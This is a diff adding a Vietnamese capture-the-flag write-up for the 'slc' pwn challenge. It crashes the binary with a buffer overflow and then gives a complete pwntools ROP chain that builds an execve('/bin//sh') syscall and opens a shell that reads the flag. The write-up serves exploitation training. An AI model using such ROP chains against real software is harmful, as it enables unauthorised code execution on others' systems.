@@ -275,6 +275,163 @@ Good[*] Process './fms' stopped with exit code 0 (pid 43923)
 
 ## It is simple, but not easy
 
+File(s): [slc](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/slc)
+
+Mình mò bài pwn cuối cả ngày trời không ra, ngó qua bài này 30' là ra :(. Đúng là đôi khi chúng ta hay chạy theo những điều hảo huyền mà bỏ quên hạnh phúc ngay bên cạnh :(.
+
+slc là gì nhỉ... sound like cat? mèo méo meo? :D. Đầu tiên, chúng ta chạy thử file:
+
+```
+kali@kali:~/Desktop/WGC August 2020$ ./slc
+How are you today? 
+>fineeee 
+The server created a number, let guess it.
+Guess the number: 
+>4
+Bad!Number is: 1804289383kali
+@kali:~/Desktop/WGC August 2020$ ./slc
+How are you today? 
+>fineeee 
+The server created a number, let guess it.
+Guess the number: 
+>1804289383
+Good
+```
+
+Chẳng hiểu gì :v. Mình thử ném file vào IDA Pro lại càng không hiểu gì do quá nhiều hàm con.
+
+Chúng ta hãy thử làm crash chương trình:
+
+```
+kali@kali:~/Desktop/WGC August 2020$ python -c "print 'Co Hien xinh dep'*100" | ./slc
+How are you today? 
+>The server created a number, let guess it.
+Guess the number: 
+>Segmentation fault
+```
+
+Chương trình bị rụng rời trước sự xinh đẹp của cô Hiền nên crash thật rồi nè :(. Có nghĩa là có lỗi Buffer Overflow làm ghi đè địa chỉ trả về.
+
+Chúng ta dùng `checksec` để kiểm tra mitigation của file:
+
+```
+kali@kali:~/Desktop/WGC August 2020$ checksec --file=slc
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               0       slc
+```
+
+`No canary found` - chúng ta có thể ghi đè địa chỉ trả về, `NX enabled` - chúng ta không thể thực thi shellcode mà chúng ta nhập vào - cần phải return về code của chương trình.
+
+Ở đây mình sẽ áp dụng kỹ thuật ROP. Kỹ thuật ROP là gì, cơ chế hoạt động như thế nào, khai thác như thế nào, ... Trong quá trình học môn Cơ chế hoạt động của mã độc, mình đã có một bài viết về ROP tại [đây](https://github.com/thuatuit001/ROP-Explanation).
+
+Mình đã trình bày khá đầy đủ ở bài viết đó, nên ở đây mình không giải thích lại. Chúng ta dùng thuật toán tìm kiếm nhị phân chạy bằng cơm để mò ra số ký tự padding, đoạn code exploit như sau:
+
+```
+from pwn import *
+from struct import pack
+
+proc = process('./slc')
+
+p = 'Co Hien xinh dep thien ha vo dich <3'*5
+p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
+p += pack('<Q', 0x00000000006cb080) # @ .data
+p += pack('<Q', 0x000000000041fd64) # pop rax ; ret
+p += '/bin//sh'
+p += pack('<Q', 0x0000000000474d71) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
+p += pack('<Q', 0x00000000006cb088) # @ .data + 8
+p += pack('<Q', 0x00000000004269bf) # xor rax, rax ; ret
+p += pack('<Q', 0x0000000000474d71) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x00000000004016b6) # pop rdi ; ret
+p += pack('<Q', 0x00000000006cb080) # @ .data
+p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
+p += pack('<Q', 0x00000000006cb088) # @ .data + 8
+p += pack('<Q', 0x00000000004431f6) # pop rdx ; ret
+p += pack('<Q', 0x00000000006cb088) # @ .data + 8
+p += pack('<Q', 0x00000000004269bf) # xor rax, rax ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004003da) # syscall
+
+proc.sendlineafter('>', p)
+proc.sendlineafter('>', '1804289383')
+proc.interactive()
+```
+
+Runnnnnnnnnnn:
+
+```
+kali@kali:~/Desktop/WGC August 2020$ python slc_exploit.py
+[+] Starting local process './slc': pid 44327
+[*] Switching to interactive mode
+$ ls
+RSHack                      fms             rtl_exploit.py
+_nothing_or_everything.png.extracted  fms_exploit.py         slc
+core                      nothing_or_everything.png  slc_exploit.py
+flag                      rtl
+$ cat flag
+flag{--- --- --- --- boodamdang --- --- --- ---}
+$ exit
+[*] Got EOF while reading in interactive
+```
+
 ## RSA 1
 
 ## Extract password from registry files
